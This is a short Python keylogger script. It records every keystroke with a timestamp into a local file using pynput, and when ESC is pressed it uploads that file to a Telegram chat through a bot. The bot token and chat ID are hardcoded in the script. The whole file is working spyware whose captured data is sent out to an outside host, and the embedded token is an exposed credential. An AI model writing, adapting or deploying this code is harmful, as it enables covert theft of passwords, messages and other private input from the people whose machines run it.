from pynput import keyboard
import datetime
import telebot

# Your Telegram credentials
TELEGRAM_BOT_TOKEN = '8107222977:AAHZnxZZhPEQ9VBLpjSCrYhnN-15EbrumC8'
TELEGRAM_CHAT_ID = '1763774480'

log_file = "keylog.txt"
running = True

# Function to send the log file to Telegram
def send_log_to_telegram():
    bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
    try:
        with open(log_file, 'rb') as f:
            bot.send_document(TELEGRAM_CHAT_ID, f)
        print("[+] Log sent to Telegram.")
    except Exception as e:
        print(f"[-] Failed to send log: {e}")

# Function triggered when key is pressed
def on_press(key):
    try:
        key_str = str(key.char)
    except AttributeError:
        key_str = f"[{key}]"

    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(log_file, "a") as f:
        f.write(f"{timestamp} - {key_str}\n")

# Function triggered when key is released
def on_release(key):
    global running
    if key == keyboard.Key.esc:
        running = False
        send_log_to_telegram()
        return False

# Main function
if __name__== "__main__":
    print("Keylogger started. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    print("Keylogger stopped.")